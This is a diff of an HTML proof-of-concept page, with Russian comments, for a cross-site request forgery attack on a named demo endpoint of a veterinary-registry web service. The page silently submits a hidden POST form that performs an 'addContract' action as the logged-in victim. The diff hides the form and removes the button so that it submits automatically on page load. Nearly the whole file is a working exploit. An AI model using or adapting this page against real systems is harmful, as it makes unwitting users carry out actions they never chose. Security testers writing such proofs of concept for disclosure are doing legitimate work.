@@ -2,30 +2,18 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>CSRF PoC - operatorui</title>
+    <title>CSRF PoC</title>
 </head>
 <body>
-    <h2>CSRF PoC - Отправка формы</h2>
-    <p>Попытка выполнить действие addContract от имени пользователя.</p>
-
-    <!-- Форма нацелена на уязвимый эндпоинт -->
-    <form id="csrf-form" action="https://demo-mercury.vetrf.ru/hs/operatorui" method="POST">
-        
-        <!-- Параметры из тела исходного запроса -->
-        <input type="hidden" name="contractNumber" value="test2" />
+    <!-- Форма скрыта от глаз, так как кнопка не нужна -->
+    <form id="csrf-form" action="https://demo-mercury.vetrf.ru/hs/operatorui" method="POST" style="display:none;">
+        <input type="hidden" name="contractNumber" value="test3" />
         <input type="hidden" name="signupDate" value="23.09.2026" />
         <input type="hidden" name="endDate" value="30.09.2026" />
         <input type="hidden" name="enterpriseTemplate" value="r" />
-        
-        <!-- Пустые значения -->
         <input type="hidden" name="firmView" value="" />
         
-        <!-- 
-          enterpriseView: восстанавливаем исходное значение.
-          В raw-запросе было %0D%0A%E2%84%96+153...%0D%0A
-          Что соответствует: \r\n№ 153, Dorgal Holdings PTY LTD (Австралия)\r\n
-          Используем HTML-сущности для возврата каретки и перевода строки.
-        -->
+        <!-- Восстановленное значение из %0D%0A%E2%84%96+153... -->
         <input type="hidden" name="enterpriseView" value="&#13;&#10;№ 153, Dorgal Holdings PTY LTD (Австралия)&#13;&#10;" />
         
         <input type="hidden" name="firm" value="" />
@@ -34,19 +22,15 @@
         <input type="hidden" name="enterprise" value="467" />
         <input type="hidden" name="_action" value="addContract" />
         
-        <!-- 
-          cancelUrl: в raw-запросе было operatorui%3F_action%3DaddContractForm
-          Раскодируем в operatorui?action=addContractForm. 
-          Браузер сам закодирует знаки ? и = при отправке.
-        -->
+        <!-- Восстановленное значение из operatorui%3F_action%3DaddContractForm -->
         <input type="hidden" name="cancelUrl" value="operatorui?action=addContractForm" />
-        
-        <input type="submit" value="Нажмите для отправки" />
     </form>
 
     <script>
-        // Автоматическая отправка формы при загрузке страницы
-        document.getElementById('csrf-form').submit();
+        // Автоматическая отправка формы сразу после загрузки DOM
+        window.onload = function() {
+            document.getElementById('csrf-form').submit();
+        };
     </script>
 </body>
 </html>
